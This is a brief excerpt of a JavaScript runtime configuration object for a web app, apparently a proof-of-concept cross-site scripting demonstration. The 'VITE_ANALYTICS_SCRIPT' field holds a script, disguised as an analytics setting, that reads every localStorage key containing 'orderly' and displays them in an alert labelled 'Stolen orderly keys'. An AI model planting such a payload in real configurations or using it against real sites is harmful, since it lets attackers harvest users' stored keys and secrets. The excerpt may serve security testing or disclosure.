window.__RUNTIME_CONFIG__ = {
  ...
  "VITE_SEO_SITE_URL": "https://xss-final.example.com",
  ...
  "VITE_ANALYTICS_SCRIPT": "<script>var s={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(k.indexOf(\"orderly\")!==-1)s[k]=localStorage.getItem(k)}alert(\"XSS on \"+document.domain+\"\\n\\nStolen orderly keys:\\n\"+JSON.stringify(s,null,2))</script>",
  "VITE_SYMBOL_LIST": "",
